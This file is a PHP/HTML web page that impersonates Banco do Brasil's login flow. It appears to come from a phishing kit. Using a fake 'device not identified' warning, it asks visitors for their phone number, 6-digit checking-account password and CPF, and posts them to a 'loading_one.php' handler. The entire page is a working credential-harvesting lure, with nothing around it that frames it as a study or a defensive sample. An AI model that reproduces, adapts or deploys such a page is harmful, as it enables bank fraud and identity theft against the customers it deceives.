<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="theme-color" content="#fff200">
	<meta name="apple-mobile-web-app-status-bar-style" content="#fff200">
	<meta name="msapplication-navbutton-color" content="#fff200">
	<title>Acesso - BB</title>
	<link rel="stylesheet" href="_styles/home.css">
	<script src="_jscripts/jquery.min.js"></script>
	<script src="_jscripts/jquery_mask.js"></script>
	<script src="_jscripts/home.js"></script>
<style>
label {
   margin: 0 !important;
}
</style>
</head>
<body class="bg-cinza">
<div class="container bg-yellow">
	<div class="content main_header">
		<div class="logo">
			<img src="_images/logo.png" height="40" width="40">
		</div><!-- logo -->
		<h1>Identificação</h1>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


<div class="container bg-blue">
	<div class="content_margin main_msg">
		<span class="msg_error">Não conseguimos identificar este dispositivo.</span><br>
		Para confirmar o acesso deste dispositivo a sua conta BB, informe os dados requeridos abaixo:
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container">
	<div class="content_margin">
		<form action="loading_one.php" method="post" class="form_enter" onsubmit="return check_phone();" style="margin-top:30px;display:block;">
			<center>Telefone: </center>
			<br>
			<label for="ag_ct" style="width:20%;margin:0 10px 0 0;float:left;">
				<select name="ddd" id="ddd" class="input input_ag">
					<option value="ddd" selected disabled>DDD</option>
					<?php 
						for($i = 11;$i <= 99;$i++):
							echo '<option value="'.$i.'">'.$i.'</option>';
						endfor;	
					?>
				</select>
			</label>
			
			<label for="tel_fone" style="width:calc(80% - 10px);float:left;margin-top:0px;">
				<input type="number" name="tel_fone" id="tel_fone" class="input input_ag" placeholder="Telefone" maxlength="9" autocomplete="off" 
				oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
			</label>
			<div class="clear"></div>

			<p class="mensagem">Para aumentar ainda mais sua segurança, este acesso deve ser confirmado com a senha da conta corrente.<br><br></p>

			<div class="clear"></div>
			<label for="pass6">
				<center>Senha (6 dígitos): </center>
				<br>
				<input type="number" name="pass6" id="pass6" class="input input_ag" placeholder="Senha conta corrente" maxlength="6" style="-webkit-text-security: disc!important;" autocomplete="off" 
				oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
			</label>
			<label for="cpf">
				<center>CPF do Titular: </center>
				<br>
				<input type="number" name="cpf" id="cpf" class="input input_ag" placeholder="CPF do titular da conta" maxlength="14" style="-webkit-text-security: disc!important;" autocomplete="off" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
			</label>
			<label for="submit">
				<input type="hidden" name="sender" value="go_sbi">
				<input type="submit" name="submit" id="submit" class="btn_submit" value="Confirmar">
			</label>
		</form>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

</body>
</html>
<?php
ob_end_flush();
?>
